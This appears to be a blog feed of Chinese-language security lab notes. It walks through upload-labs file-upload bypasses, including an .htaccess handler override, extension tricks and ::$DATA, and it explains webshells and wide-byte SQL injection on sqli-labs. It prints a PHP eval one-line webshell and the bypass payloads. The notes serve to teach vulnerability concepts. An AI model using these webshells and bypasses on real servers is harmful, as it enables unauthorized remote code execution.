        <content type="html"><![CDATA[<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230602092842788.png" alt="image-20230602092842788"></p><h2 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01(js验证)"></a>pass-01(js验证)</h2><p>上传木马后</p><p>提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232014129.png" alt="image-20230523232014129"></p><h4 id="分析一下代码"><a href="#分析一下代码" class="headerlink" title="分析一下代码"></a>分析一下代码</h4><p>这里我们跳过弹窗的提示，可以看出来这个验证是前端进行的，</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232753987.png" alt="image-20230523232753987"></p><p>从标记的代码中可以看出，使用了onsubmit这个函数，触发了文件提交事件，在表单提交后马上调用了return checkFile 这个函数对上传进行了检查。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"><a href="#第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。" class="headerlink" title="第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。"></a>第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523234905931.png" alt="image-20230523234905931"></p><p>把onsubmit这个函数删掉，</p><p>把script代码也删掉</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235125426.png" alt="image-20230523235125426"></p><p> 在form表单中添加第一关的提交地址</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235402326.png" alt="image-20230523235402326"></p><h5 id="第二种：直接按F12-把onsubmit这个直接删除掉"><a href="#第二种：直接按F12-把onsubmit这个直接删除掉" class="headerlink" title="第二种：直接按F12 把onsubmit这个直接删除掉"></a>第二种：直接按F12 把onsubmit这个直接删除掉</h5><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235950881.png" alt="image-20230523235950881"></p><p>不推荐第二种，因为如果是在浏览器查看器中直接删除的话，可能他还有一些正常的js，</p><p>如果把正常的js给删除掉的话，可能正常的js会影响到上传操作。</p><h2 id="pass-02-后端验证-文件类型校验-MIME校验"><a href="#pass-02-后端验证-文件类型校验-MIME校验" class="headerlink" title="pass-02(后端验证) 文件类型校验 (MIME校验)"></a>pass-02(后端验证) 文件类型校验 (MIME校验)</h2><p>上传木马后</p><p>提示：本pass在服务端对数据包的MIME进行检查。</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230528133234181.png" alt="image-20230528133234181"></p><p>分析代码：</p><p>从源码中可以看出只对文件类型(type) 进行验证，必须是image/jpeg或者image/png 或者image/gif的格式，没有对后缀名进行验证，</p><p>只需要bp抓包将Content-Type:的参数修改成image/jpeg 或者image/png 或者image/gif其中的一种，进行绕过就好。</p><p>操作步骤：</p><p>开始bp抓包，修改content-type类型即可</p><h3 id="理解一下什么是MIME？"><a href="#理解一下什么是MIME？" class="headerlink" title="理解一下什么是MIME？"></a>理解一下什么是MIME？</h3><h6 id="MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"><a href="#MIME-多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。" class="headerlink" title="MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。"></a>MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。</h6><p>$_FILES[‘myfile’][‘type’]文件的MIME类型，需要浏览器提供该信息的支持，例如”image/gif”</p><p>MIME 给出的是文件的MIME信息 ，此信息可以用来在HTTP Conten-type 头 信息中发送 正确的信息，如：header(“Cotent-type:image/gif”)</p><pre><code>文件格式编辑播报最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。MIME意为多功能Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。七种大类别：videoimageapplicationtextaudiomultipartmessage常见的MIME类型(通用型)：超文本标记语言文本 .html text/htmlxml文档 .xml text/xmlXHTML文档 .xhtml application/xhtml+xml普通文本 .txt text/plainRTF文本 .rtf application/rtfPDF文档 .pdf application/pdfMicrosoft Word文件 .word application/mswordPNG图像 .png image/pngGIF图形 .gif image/gifJPEG图形 .jpeg,.jpg image/jpegau声音文件 .au audio/basicMIDI音乐文件 mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 .ra, .ram audio/x-pn-realaudioMPEG文件 .mpg,.mpeg video/mpegAVI文件 .avi video/x-msvideoGZIP文件 .gz application/x-gzipTAR文件 .tar application/x-tar任意的二进制数据 application/octet-stream</code></pre><h5 id="涉及的函数用法"><a href="#涉及的函数用法" class="headerlink" title="涉及的函数用法"></a>涉及的函数用法</h5><pre><code>trim():去除左右两侧的空白deldot（）：删除末尾的店strrchar(string,char):函数查找串，在string字符串中查找，char在string字符串中最后一次出现的位置，返回并从该位置截取到尾，如果没有找到字符，则返回falsestrrchar(&#39;hello  wordld,i love you &#39;,&#39;i&#39;)输出结果： i love you strtolower():函数 把所有字符串装换成小写str_ireplace(fine,replace,strin):替换，在strin字符串中，去搜索fine字符串，如果搜到到匹配上了，用replace字符串进行替换</code></pre><h2 id="pass-03-文件后缀名，黑名单绕过"><a href="#pass-03-文件后缀名，黑名单绕过" class="headerlink" title="pass-03(文件后缀名，黑名单绕过)"></a>pass-03(文件后缀名，黑名单绕过)</h2><p>上传木马后</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！            </p><p>查看原代码</p><pre><code>&lt;?phpinclude &#39;../config.php&#39;;include &#39;../common.php&#39;;include &#39;../head.php&#39;;include &#39;../menu.php&#39;;$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;?&gt;</code></pre><h4 id="分析一下代码："><a href="#分析一下代码：" class="headerlink" title="分析一下代码："></a>分析一下代码：</h4><p>这里使用了数组的方式，设置了黑名单，不允许.asp  .aspx  .php  .jsp 的后缀名文件进行上传。</p><h4 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a>绕过思路：</h4><p>php开发了这么久了，不止只有这一个文件名，我们可以使用其他的php的别名进行绕</p><p>过：.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345 （但是这里是有前提条件的）就是对方的</p><p>服务器的配置有对这些php其他的文件名配置了解析的设置，否认就算你上传上去了，还是解析失败。</p><p>配置好了对应的解析，直接修改文件名就好了把1.php修改成你配置的对应的解析的文件名。</p><h4 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h4><p>test.php修改后test.phtml    上传成功！</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523230745151.png" alt="image-20230523230745151"></p><p>蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523231053874.png" alt="image-20230523231053874"></p><h2 id="pass-04-文件名后缀验证，配置文件解析控制"><a href="#pass-04-文件名后缀验证，配置文件解析控制" class="headerlink" title="pass-04(文件名后缀验证，配置文件解析控制)"></a>pass-04(文件名后缀验证，配置文件解析控制)</h2><p>上传木马后</p><p>提示：此文件不允许上传!     </p><p>查看一下源代码</p><p>黑名单里面禁止上传这些后缀的文件</p><pre><code class="php">.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini</code></pre><p>  <img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230524203551062.png" alt="image-20230524203551062">     </p><p>从源代码中可以看出，还是使用了一个黑名单的限制，对文件的后缀名进行了验证，并且限制的后缀名比之前的更多。但是我们可以从黑名单中看出没有对.htaccess文件进行验证，那么我们就可以使用.htaccess进行绕过。</p><h5 id="htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。"><a href="#htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个-htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。-htaccess文件只对Apache服务器有效-。" class="headerlink" title=".htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。"></a>.htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。</h5><p>操作步骤：</p><p>1.首先先创建一个 .htaccess 的文件在文件中写入</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>2.把这个文件上传到服务器上。</p><p>3.将一句话木马文件名修改成gif/png/jpe其中格式的一种。比如2.png</p><p> 上传成功。</p><p>4.将p.git(一句话木马的文件)上传到服务器</p><p>这里的关键点就是.htaccess这个文件，把所有的目录下的文件的解析方式都修改成了php，</p><p>所以我们第二次上传的图片2.png “png”不在黑名单中，但是由于.htaccess文件所以又把他解析成了php的格式，所以可以完成正常的解析。</p><h2 id="pass-05-文件名后缀验证-点-空格-点"><a href="#pass-05-文件名后缀验证-点-空格-点" class="headerlink" title="pass-05(文件名后缀验证 ,点+空格+点)"></a>pass-05(文件名后缀验证 ,点+空格+点)</h2><p>查看源码</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件类型不允许上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><pre><code>定义两个变量：is_upload代表文件是否上传成功，msg代表错误信息提示。if...sumit检测是否有表单提交数据通过检测$_POST数组中是否存在’submit’键名。if(file_exits (UPLOAD_PATH))&#123;如果指定的文件夹存在通过检测目录是否存在(即在服务器上是否有上传文件夹)$deny_ext黑名单,定义了一个包含不允许上传的文件类型的$deny_ext数组$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);$file_name = deldot($file_name);//删除文件名末尾的点获取上传文件名并删除文件名末尾的点$file_ext = strrchr($file_name, &#39;.&#39;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空从上传文件名中提取文件扩展名并运行一些大小写转换和字符串替换处理。if (!in_array($file_ext, $deny_ext)) &#123;如果文件类型是可接受的，则执行下一步操作。、$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;获取上传文件在服务器临时目录中的路径和在指定目录中显示的路径。if (move_uploaded_file($temp_file, $img_path)) &#123;    $is_upload = true;&#125; else &#123;    $msg = &#39;上传出错！&#39;;&#125;将上传文件从服务器临时目录移动到指定目录，并确定是否上传成功，$msg则保存了任何错误信息。&#125; else &#123;    $msg = &#39;此文件类型不允许上传！&#39;;&#125;如果文件类型不是可接受的，则发送错误提示消息。&#125; else &#123;    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;&#125;如果指定的上传文件夹不存在，则向用户返回一条错误消息。</code></pre><p>bp抓包看看</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231428383.png" alt="image-20230610231428383"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231151446.png" alt="image-20230610231151446"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231315662.png" alt="image-20230610231315662"></p><h2 id="Pass-06-文件名后缀验证，大小写绕过"><a href="#Pass-06-文件名后缀验证，大小写绕过" class="headerlink" title="Pass-06 (文件名后缀验证，大小写绕过)"></a>Pass-06 (文件名后缀验证，大小写绕过)</h2><p>查看提示，黑名单禁止上传</p><pre><code>.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini</code></pre><p>查看源代码</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>源码中没有转换成小写，所以我们可以用大小写绕过</p><h2 id="Pass-07-文件名后缀验证-空格绕过"><a href="#Pass-07-文件名后缀验证-空格绕过" class="headerlink" title="Pass-07 (文件名后缀验证,空格绕过)"></a>Pass-07 (文件名后缀验证,空格绕过)</h2><p><code>$file_name= trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); //代码中无收尾去空函数trim() //去除字符串中的空格</code></p><p>方法：<code>后缀加空格</code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175638767.png" alt="image-20230610175638767"></p><p>然后用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175730423.png" alt="image-20230610175730423"></p><h2 id="pass-08-文件名后缀验证-点绕过"><a href="#pass-08-文件名后缀验证-点绕过" class="headerlink" title="pass-08(文件名后缀验证,点绕过)"></a>pass-08(文件名后缀验证,点绕过)</h2><p>代码中无deldot()函数 //删除文件名末尾的点</p><p>   <code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>方法：<code>在后缀 . </code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223429650.png" alt="image-20230610223429650"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223253561.png" alt="image-20230610223253561"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223326733.png" alt="image-20230610223326733"></p><h2 id="pass-09-文件名后缀验证-DATA绕过"><a href="#pass-09-文件名后缀验证-DATA绕过" class="headerlink" title="pass-09(文件名后缀验证,::$DATA绕过)"></a>pass-09(文件名后缀验证,::$DATA绕过)</h2><p>源码中</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p><p>少了str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p><h3 id="利用Windows特性"><a href="#利用Windows特性" class="headerlink" title="利用Windows特性"></a>利用Windows特性</h3><h4 id="在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名"><a href="#在window的时候如果文件名-”-DATA”会把-DATA之后的数据当成文件流处理-不会检测后缀名，且保持-DATA之前的文件名，他的目的就是不检查后缀名" class="headerlink" title="在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名"></a><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></h4><p>科普一下</p><p>什么是::$DATA呢？</p><p>::$DATA这是一种windows操作系统处理文件时的特性，为<code>文件流</code>，如果文件名后有此标记::$DATA</p><p>,并且没有做过滤，windows会不检查，直接保存该文件。使用他的目的就是不检查后缀名。</p><p>所以我们只要在文件名后面加上::$DATA就可以成功绕过</p><h3 id="方法：后缀加上-DATA"><a href="#方法：后缀加上-DATA" class="headerlink" title="方法：后缀加上::$DATA"></a>方法：<strong>后缀加上::$DATA</strong></h3><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224605256.png" alt="image-20230610224605256"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224421981.png" alt="image-20230610224421981"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224445287.png" alt="image-20230610224445287"></p><h2 id="pass-10-文件名后缀验证-点-空格-点"><a href="#pass-10-文件名后缀验证-点-空格-点" class="headerlink" title="pass-10(文件名后缀验证,点+空格+点)"></a>pass-10(文件名后缀验证,点+空格+点)</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="websell"><a href="#websell" class="headerlink" title="websell"></a>websell</h2><h3 id="什么叫做webshell？"><a href="#什么叫做webshell？" class="headerlink" title="什么叫做webshell？"></a>什么叫做webshell？</h3><p>1.webshell,简称为网页后门。简单来说它是运行在web应用之上的远程控制程序。</p><p>2.webshell是一张网页，由PHP，JSP,ASP,NET等这类web应用开发程序语言开发，但webshell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</p><h3 id="常见的webshell有哪些？"><a href="#常见的webshell有哪些？" class="headerlink" title="常见的webshell有哪些？"></a>常见的webshell有哪些？</h3><p>1.大马、小马、一句话木马、菜刀马、脱库马、各种马…等</p><p>2，拥有较完整功能的webshell，我们一般称为大马</p><p>3.功能相对简单的webshell成为小马</p><h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><h3 id="怎样能获取getshell？"><a href="#怎样能获取getshell？" class="headerlink" title="怎样能获取getshell？"></a>怎样能获取getshell？</h3><h3 id="webshell之php一句话木马解读"><a href="#webshell之php一句话木马解读" class="headerlink" title="webshell之php一句话木马解读"></a>webshell之php一句话木马解读</h3><pre><code>&lt;?php @eval($_post[x]);?&gt;</code></pre><p>$_post[x]:获取post请求参数中x的值。例如post请求中传递x=phpinfo(); , 那么$_post[x]就等同于</p><p>phpinfo(); </p><p>eval()将字符串当做PHP代码运行。例如eval(’phpinfo();’) , 其中phpinfo();会被当做PHP代码去执行。</p><pre><code>&lt;?php @eval($_POST[X]);?&gt;    实际上的传递过程是这样的&lt;?php @eval(`phpinfo();`);?&gt;   实际的语句是这样的</code></pre><p>我们通过该webshell，传递任意php代码，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/"/>
      <url>/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/</url>
      
        <content type="html"><![CDATA[<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过sql注入防御。</p><h3 id="常见的字符集"><a href="#常见的字符集" class="headerlink" title="常见的字符集"></a>常见的字符集</h3><p>ascii编码：单字节编码</p><p>0x00 null<br>0x20<br>0x21 !<br>0x22 “<br>0x23 #<br>0x24 $<br>0x25 %<br>0x26 &amp;<br>0x27 ’<br>0x28 (<br>0x29)<br>0x2A *<br>0x2B +<br>0x2C ,<br>0x2D -<br>0x2E .<br>0x2F /<br>0x3A :<br>0x3B ;<br>0x3C &lt;<br>0x3D =<br>0x3E &gt;<br>0x3F ?<br>0x40 @<br>0x5B [<br>0x5C<br>0x5D ]<br>0x5E ^<br>0x5F _<br>0x60 `<br>0x7B {<br>0x7C |<br>0x7D }<br>0x7E ~</p><p>latin1编码：单字节编码</p><p>gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和ascii保持一致。双字节的第一个字节范围是0x81-0xFE</p><p>utf-8编码：使用一至四字节编码，0x00-0x7F范围内是一位，和ascii保持一致。其他字符用二至四个字节变长表示。</p><h3 id="MySQL字符转换"><a href="#MySQL字符转换" class="headerlink" title="MySQL字符转换"></a>MySQL字符转换</h3><p>数据提交到mysql数据库，需要进行字符集的转换，使得mysql数据库可以对数据进行处理，这个过程一般有以下三个步骤：</p><p>收到请求，将请求数据从character_set_client -&gt;character_set_connection.</p><p>内部操作，将数据从character_set_connection  –&gt;表创建的字符集。</p><p>结果输出，将数据从表创建的字符集 –&gt;character_set_results。</p><p>当执行set names ”charset”，相当于执行</p><p>set character_set_client = charset</p><p>set character_set_connection = charset</p><p>set character_set_results = charset</p><p>client 指的是php程序</p><p>connection指的是php客户端与mysql服务器之间连接层</p><p>results 指的是mysql服务器返回给PHP客户端的结果</p><h3 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs/less-32"></a>sqli-labs/less-32</h3><p>1.查看源码</p><pre><code>&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string)&#123;    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash              return $string;&#125;// take the variables if(isset($_GET[&#39;id&#39;]))&#123;$id=check_addslashes($_GET[&#39;id&#39;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    &#123;      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      &#125;&#125;    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;                ?&gt;</code></pre><p>普通注入</p><pre><code>?id=1&#39;</code></pre><p><img src="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/image-20230521112543826.png" alt="image-20230521112543826"></p><p>第一步：被check_addslashes函数转义</p><p><code>check_addslashes</code> 函数并不是完全安全的，因为它只是简单地添加反斜杠来转义特殊字符。</p><p>第二步：在执行sql查询之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</p><p>第三步：character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</p><p>第四步：character_set_client –&gt;character_set_connection编码完全一致，数据没有任何转换，所以输入是%5C%27,输出的是%5%27</p><p>第五步：character_set_connection  –&gt;table charset这里我们需要关注下使用的表的字符集。</p><p><img src="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/image-20230521203503187.png" alt="image-20230521203503187"></p><p>可以看到id参数没有设置编码方式，不会对%5C%27进行处理。在这里mysql服务器将查询语句执行，并返回结果。</p><p>执行的sql语句为：</p><p>$sql=“SELECT * FROM users WHERE id=‘1’’ LIMIT 0,1”;<br> ‘被转义无法进行注入</p><p>第六步：table charset –&gt;character_set_results字符集也设定为gbk，保证了输出内容没有乱码。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
